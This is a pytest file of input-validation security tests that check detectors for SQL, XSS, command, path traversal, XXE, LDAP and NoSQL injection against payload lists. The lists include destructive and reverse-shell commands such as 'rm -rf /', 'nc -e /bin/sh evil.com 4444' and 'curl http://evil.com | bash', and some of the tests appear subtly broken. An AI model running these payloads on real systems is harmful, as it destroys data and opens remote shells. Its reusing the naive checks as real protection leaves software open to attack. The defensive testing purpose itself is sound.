import pytest
import json
import re
from unittest.mock import Mock, patch
from fastapi import HTTPException
from fastapi.testclient import TestClient
import bleach
import sqlparse
from urllib.parse import quote, unquote


class TestInputValidationSecurity:
    """Comprehensive security tests for input validation"""

    def test_sql_injection_prevention(self):
        """Test prevention of SQL injection attacks"""
        # Common SQL injection payloads
        sql_injection_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM users; --",
            "admin' --",
            "' OR 1=1; --",
            "') OR ('1'='1",
            "'; EXEC xp_cmdshell('dir'); --",
            "1; SELECT * FROM information_schema.tables; --",
            "admin'; SHUTDOWN; --",
            "' OR ''='",
        ]

        def simulate_sql_query(user_input: str) -> str:
            # Simulate a vulnerable query (DO NOT USE IN PRODUCTION)
            # This is for testing purposes only
            query = f"SELECT * FROM users WHERE username = '{user_input}'"
            return query

        def is_sql_injection_safe(query: str) -> bool:
            # Parse the query to detect injection patterns
            try:
                parsed = sqlparse.parse(query)[0]
                # Check for suspicious tokens
                suspicious_tokens = ['DROP', 'DELETE', 'UPDATE', 'INSERT', 'EXEC', 'UNION', 'SHUTDOWN']
                query_upper = query.upper()

                for token in suspicious_tokens:
                    if token in query_upper:
                        return False
                return True
            except:
                return False

        for payload in sql_injection_payloads:
            query = simulate_sql_query(payload)
            # In a real application, this should be sanitized
            # For testing, we verify detection
            assert not is_sql_injection_safe(query), f"SQL injection not detected: {payload}"

    def test_xss_prevention(self):
        """Test prevention of Cross-Site Scripting (XSS) attacks"""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(\"XSS\")'>",
            "<body onload=alert('XSS')>",
            "<div style='background-image: url(javascript:alert(\"XSS\"))'>",
            "<meta http-equiv='refresh' content='0; url=javascript:alert(\"XSS\")'>",
            "<object data='javascript:alert(\"XSS\")'>",
            "<embed src='javascript:alert(\"XSS\")'>",
        ]

        def sanitize_html_input(input_text: str) -> str:
            # Use bleach for HTML sanitization
            return bleach.clean(input_text, strip=True)

        for payload in xss_payloads:
            sanitized = sanitize_html_input(payload)
            # After sanitization, dangerous tags should be removed
            assert '<script>' not in sanitized.lower(), f"XSS script tag not sanitized: {payload}"
            assert 'javascript:' not in sanitized.lower(), f"JavaScript URL not sanitized: {payload}"
            assert 'onerror' not in sanitized.lower(), f"Event handler not sanitized: {payload}"
            assert 'onload' not in sanitized.lower(), f"Event handler not sanitized: {payload}"

    def test_command_injection_prevention(self):
        """Test prevention of command injection attacks"""
        command_injection_payloads = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "`whoami`",
            "$(rm -rf /)",
            "; wget http://evil.com/malware",
            "| nc -e /bin/sh evil.com 4444",
            "; curl http://evil.com | bash",
            "`curl http://evil.com`",
            "$(curl http://evil.com | bash)",
            "; python -c 'import os; os.system(\"rm -rf /\")'",
        ]

        def simulate_command_execution(user_input: str) -> str:
            # Simulate vulnerable command execution (DO NOT USE IN PRODUCTION)
            command = f"echo 'Processing: {user_input}'"
            return command

        def is_command_injection_safe(command: str) -> bool:
            # Check for command injection patterns
            dangerous_chars = [';', '|', '`', '$', '(', ')']
            for char in dangerous_chars:
                if char in command:
                    return False
            return True

        for payload in command_injection_payloads:
            command = simulate_command_execution(payload)
            assert not is_command_injection_safe(command), f"Command injection not detected: {payload}"

    def test_path_traversal_prevention(self):
        """Test prevention of path traversal attacks"""
        path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            ".../...//etc/passwd",
            "..\\..\\..\\..\\..\\..\\windows\\win.ini",
            "/../../../../etc/passwd",
            "\\\\evil.com\\share\\malicious.exe",
        ]

        def normalize_path(user_path: str) -> str:
            # URL decode
            decoded = unquote(user_path)
            # Remove path traversal sequences
            normalized = re.sub(r'\.\./', '', decoded)
            normalized = re.sub(r'\.\.\\', '', normalized)
            return normalized

        def is_path_traversal_safe(path: str) -> bool:
            # Check for path traversal patterns
            traversal_patterns = [
                r'\.\./',
                r'\.\.\\',
                r'%2e%2e%2f',
                r'%2e%2e%5c',
            ]
            for pattern in traversal_patterns:
                if re.search(pattern, path, re.IGNORECASE):
                    return False
            return True

        for payload in path_traversal_payloads:
            assert not is_path_traversal_safe(payload), f"Path traversal not detected: {payload}"

            # Test normalization
            normalized = normalize_path(payload)
            # After normalization, should not contain traversal sequences
            assert '../' not in normalized, f"Path traversal not normalized: {payload}"
            assert '..\\' not in normalized, f"Path traversal not normalized: {payload}"

    def test_json_injection_prevention(self):
        """Test prevention of JSON injection attacks"""
        json_injection_payloads = [
            '{"user": "admin", "role": "admin"}',
            '{"user": "admin", "role": "admin", "extra": "malicious"}',
            '{"user": "admin"}' + '\n{"user": "hacker", "role": "admin"}',
            '{"user": "admin", "data": {"nested": "value", "injected": "malicious"}}',
        ]

        def parse_user_json(json_str: str) -> dict:
            try:
                data = json.loads(json_str)
                # Validate expected structure
                if not isinstance(data, dict):
                    raise ValueError("Invalid JSON structure")
                if 'user' not in data:
                    raise ValueError("Missing user field")
                return data
            except json.JSONDecodeError:
                raise ValueError("Invalid JSON")

        for payload in json_injection_payloads:
            try:
                parsed = parse_user_json(payload)
                # Verify that only expected fields are present
                expected_fields = {'user', 'role'}  # Define expected schema
                extra_fields = set(parsed.keys()) - expected_fields
                if extra_fields:
                    # In strict mode, reject extra fields
                    assert False, f"JSON injection detected - extra fields: {extra_fields}"
            except (ValueError, json.JSONDecodeError):
                # Invalid JSON should be rejected
                pass

    def test_regex_dos_prevention(self):
        """Test prevention of Regular Expression Denial of Service (ReDoS)"""
        # ReDoS vulnerable patterns (avoid these in production)
        vulnerable_patterns = [
            r"(a+)+b",  # Catastrophic backtracking
            r"(x+)+y",
            r"(a*)*",
            r"(a|a)*",
            r"(a+)*",
        ]

        # Safe test inputs that could cause ReDoS
        redos_inputs = [
            "a" * 100 + "b",
            "x" * 50 + "y",
            "a" * 30,
            "a" * 20,
            "a" * 25,
        ]

        def test_regex_performance(pattern: str, test_input: str, timeout: float = 1.0) -> bool:
            import time
            start_time = time.time()
            try:
                re.search(pattern, test_input)
                end_time = time.time()
                return (end_time - start_time) < timeout
            except:
                return False

        for pattern in vulnerable_patterns:
            for test_input in redos_inputs:
                # These should complete quickly even with vulnerable patterns
                assert test_regex_performance(pattern, test_input), f"ReDoS vulnerability detected in pattern: {pattern}"

    def test_xml_external_entity_prevention(self):
        """Test prevention of XML External Entity (XXE) attacks"""
        xxe_payloads = [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://evil.com/malicious">]><root>&xxe;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe PUBLIC "evil" "http://evil.com/malicious">]><root>&xxe;</root>',
        ]

        def parse_xml_safely(xml_content: str) -> bool:
            # In a real application, use defusedxml or similar
            # For testing, we'll just check for ENTITY declarations
            if '<!ENTITY' in xml_content:
                return False  # XXE attempt detected
            return True

        for payload in xxe_payloads:
            assert not parse_xml_safely(payload), f"XXE attack not detected: {payload[:50]}..."

    def test_ldap_injection_prevention(self):
        """Test prevention of LDAP injection attacks"""
        ldap_injection_payloads = [
            "*)(uid=*))(|(uid=*",
            "*)(objectClass=*))(|(objectClass=*",
            "admin*)(&",
            "*)(|(objectClass=*",
            "*/*",
            "admin))(|(cn=*",
        ]

        def simulate_ldap_query(user_input: str) -> str:
            # Simulate vulnerable LDAP query
            query = f"(&(uid={user_input})(objectClass=user))"
            return query

        def is_ldap_injection_safe(query: str) -> bool:
            # Check for LDAP injection patterns
            dangerous_chars = ['*', '(', ')', '|', '&']
            dangerous_sequences = ['*)', '(*', '))', '((', '*))', ')*)']

            for seq in dangerous_sequences:
                if seq in query:
                    return False
            return True

        for payload in ldap_injection_payloads:
            query = simulate_ldap_query(payload)
            assert not is_ldap_injection_safe(query), f"LDAP injection not detected: {payload}"

    def test_no_sql_injection_prevention(self):
        """Test prevention of NoSQL injection attacks"""
        nosql_injection_payloads = [
            '{"$gt": ""}',
            '{"$where": "this.password.length > 0"}',
            '{"username": {"$ne": null}}',
            '{"$or": [{"username": "admin"}, {"password": {"$ne": null}}]}',
            '{"username": {"$regex": ".*"}}',
        ]

        def simulate_mongo_query(user_input: str) -> dict:
            # Simulate vulnerable MongoDB query
            try:
                # If user input is JSON, parse it
                if user_input.startswith('{'):
                    injected = json.loads(user_input)
                    return {"username": injected}
                else:
                    return {"username": user_input}
            except:
                return {"username": user_input}

        def is_nosql_injection_safe(query: dict) -> bool:
            # Check for NoSQL injection patterns
            def check_dict(d):
                if not isinstance(d, dict):
                    return True
                for key, value in d.items():
                    if key.startswith('$'):
                        return False  # MongoDB operator injection
                    if isinstance(value, dict):
                        if not check_dict(value):
                            return False
                return True

            return check_dict(query)

        for payload in nosql_injection_payloads:
            query = simulate_mongo_query(payload)
            assert not is_nosql_injection_safe(query), f"NoSQL injection not detected: {payload}"

    def test_file_upload_security(self):
        """Test file upload security"""
        dangerous_files = [
            "malicious.exe",
            "script.php",
            "evil.jsp",
            "dangerous.asp",
            "hack.py",
            "virus.bat",
            "malware.sh",
        ]

        safe_extensions = ['.txt', '.jpg', '.png', '.pdf', '.docx']

        def is_file_upload_safe(filename: str) -> bool:
            # Check file extension
            if not any(filename.lower().endswith(ext) for ext in safe_extensions):
                return False

            # Check for path traversal
            if '../' in filename or '..\\' in filename:
                return False

            # Check for null bytes
            if '\x00' in filename:
                return False

            return True

        for filename in dangerous_files:
            assert not is_file_upload_safe(filename), f"Dangerous file upload not blocked: {filename}"

        # Test safe files
        for ext in safe_extensions:
            safe_filename = f"document{ext}"
            assert is_file_upload_safe(safe_filename), f"Safe file incorrectly blocked: {safe_filename}"

    def test_input_length_limits(self):
        """Test input length limits to prevent buffer overflow"""
        max_length = 1000

        def validate_input_length(input_str: str) -> bool:
            return len(input_str) <= max_length

        # Test normal inputs
        assert validate_input_length("normal input") is True
        assert validate_input_length("a" * 1000) is True

        # Test oversized inputs
        assert validate_input_length("a" * 1001) is False
        assert validate_input_length("a" * 10000) is False

    def test_unicode_normalization(self):
        """Test Unicode normalization for security"""
        # Test homograph attacks (visually similar characters)
        homograph_pairs = [
            ("аdmin", "admin"),  # Cyrillic 'а' vs Latin 'a'
            ("mіcrosoft", "microsoft"),  # Ukrainian 'і' vs Latin 'i'
            ("рaypal", "paypal"),  # Cyrillic 'р' vs Latin 'p'
        ]

        import unicodedata

        for homoglyph, normal in homograph_pairs:
            # Normalize to NFC form
            normalized_homoglyph = unicodedata.normalize('NFC', homoglyph)
            normalized_normal = unicodedata.normalize('NFC', normal)

            # They should be different after normalization if they are true homoglyphs
            assert normalized_homoglyph != normalized_normal, f"Homoglyph not detected: {homoglyph} vs {normal}"

    @pytest.mark.asyncio
    async def test_input_validation_integration(self):
        """Integration test for input validation in API endpoints"""
        # This would test actual API endpoints with malicious inputs
        # For now, we'll simulate the behavior

        malicious_inputs = {
            'sql_injection': "' OR '1'='1",
            'xss': '<script>alert("XSS")</script>',
            'command_injection': '; rm -rf /',
            'path_traversal': '../../../etc/passwd',
        }

        # Simulate API endpoint validation
        def validate_api_input(input_type: str, input_value: str) -> bool:
            if input_type == 'sql_injection':
                return not any(char in input_value for char in ["'", ";", "--"])
            elif input_type == 'xss':
                return not any(tag in input_value.lower() for tag in ['<script>', '<img', 'javascript:'])
            elif input_type == 'command_injection':
                return not any(char in input_value for char in [';', '|', '`', '$'])
            elif input_type == 'path_traversal':
                return not '../' in input_value and not '..\\' in input_value
            return True

        for input_type, malicious_value in malicious_inputs.items():
            assert not validate_api_input(input_type, malicious_value), f"Malicious {input_type} input not blocked: {malicious_value}"


class TestInputSanitization:
    """Test input sanitization functions"""

    def test_html_sanitization(self):
        """Test HTML sanitization"""
        html_inputs = [
            '<b>Bold text</b>',
            '<script>alert("XSS")</script><p>Safe text</p>',
            '<img src="safe.jpg" onerror="alert(\'XSS\')">',
            '<a href="javascript:alert(\'XSS\')">Click me</a>',
        ]

        expected_outputs = [
            '<b>Bold text</b>',
            '<p>Safe text</p>',
            '<img src="safe.jpg">',
            '<a>Click me</a>',
        ]

        for input_html, expected in zip(html_inputs, expected_outputs):
            sanitized = bleach.clean(input_html, tags=['b', 'p', 'img', 'a'], attributes={'img': ['src'], 'a': ['href']})
            assert sanitized == expected, f"HTML sanitization failed for: {input_html}"

    def test_sql_parameterization(self):
        """Test SQL query parameterization"""
        # Simulate parameterized query
        def execute_parameterized_query(query_template: str, params: tuple) -> str:
            # In real implementation, use proper parameterized queries
            return query_template % params

        safe_query = "SELECT * FROM users WHERE id = %s AND name = %s"
        safe_params = (123, "John Doe")

        result = execute_parameterized_query(safe_query, safe_params)
        assert "123" in result and "John Doe" in result

        # Malicious params should be treated as literal values
        malicious_params = ("'; DROP TABLE users; --", "hacker")
        malicious_result = execute_parameterized_query(safe_query, malicious_params)
        # The malicious SQL should be escaped/treated as literal
        assert "DROP TABLE" not in malicious_result.upper()

    def test_url_encoding_handling(self):
        """Test URL encoding/decoding security"""
        encoded_payloads = [
            "%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E",  # <script>alert('XSS')</script>
            "%2E%2E%2F%2E%2E%2Fetc%2Fpasswd",  # ../../etc/passwd
            "%27%20OR%20%271%27%3D%271",  # ' OR '1'='1
        ]

        for encoded in encoded_payloads:
            decoded = unquote(encoded)
            # After decoding, should still be validated
            assert '<script>' in decoded or '../' in decoded or "' OR '1'='1" in decoded

    def test_input_whitelisting(self):
        """Test input whitelisting approach"""
        allowed_chars = set('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-.')

        def whitelist_validate(input_str: str) -> bool:
            return all(char in allowed_chars for char in input_str)

        safe_inputs = [
            "username123",
            "file-name.txt",
            "user_name",
            "test.domain.com",
        ]

        malicious_inputs = [
            "<script>",
            "../../../etc/passwd",
            "user' OR '1'='1",
            "file; rm -rf /",
        ]

        for safe_input in safe_inputs:
            assert whitelist_validate(safe_input), f"Safe input rejected: {safe_input}"

        for malicious_input in malicious_inputs:
            assert not whitelist_validate(malicious_input), f"Malicious input accepted: {malicious_input}"